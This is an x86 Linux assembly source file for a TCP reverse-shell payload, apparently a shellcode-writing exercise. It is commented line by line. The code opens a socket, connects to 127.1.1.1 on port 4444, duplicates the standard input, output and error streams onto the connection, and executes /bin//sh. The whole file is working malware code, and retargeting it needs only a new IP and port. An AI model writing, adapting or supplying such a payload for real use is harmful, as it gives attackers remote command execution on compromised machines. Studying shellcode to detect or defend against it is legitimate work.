; TCP Reverse Shell
; Author: geobour98 

global _start

section .text

_start:
	; socket 
	xor eax, eax
	mov ax, 0x167		; 167 is the hex value of the decimal 359 for socket

	xor ebx, ebx
	mov bl, 0x2		; AF_INET numeric value from PF_INET protocol family

	xor ecx, ecx
	mov cl, 0x1		; SOCK_STREAM constant from socket_type.h

	xor edx, edx		; 0 value because of single protocol	

	int 0x80		; exec socket syscall 

	mov ebx, eax		; move sockfd (file descriptor) value into ebx

	; connect
	xor eax, eax
	mov ax, 0x16a		; 16a is the hex value of the decimal 362 for connect

	push 0x0101017f		; connect to localhost (127.1.1.1) (little endian)
	
	push word 0x5c11	; connect to port 4444 (little endian)
	
	push word 0x2		; AF_INET constant
	
	xor ecx, ecx
	mov ecx, esp		; ecx now points at address struct at the top of the stack
	
	xor edx, edx
	mov dl, 0x10		; 10 is the decimal 16 that is the size of the address struct

	int 0x80		; execute connect syscall

	; dup2 loop
	xor ecx, ecx		; clear ecx
	mov cl, 0x3		; set counter to 3

dup2loop:
	xor eax, eax
	mov al, 0x3f		; 3f is the hex value of the decimal 63 for dup2

	dec cl			; decrement counter by 1

	int 0x80		; exec dup2 syscall

	jnz dup2loop		; jump to loop if ZF is not zero, else continue

	; execve
	xor eax, eax
	mov al, 0xb		; b is the hex value of the decimal 11 for execve        

	xor edx, edx
	push edx		; NULL argument
	push edx		; NULL argument
	push edx		; null terminator

        ; PUSH /bin//sh
        push 0x68732f2f		; "hs//"
        push 0x6e69622f		; "nib/"

	mov ebx, esp		; ebx points at "/bin//sh" at the top of the stack

	int 0x80		; exec execve syscall
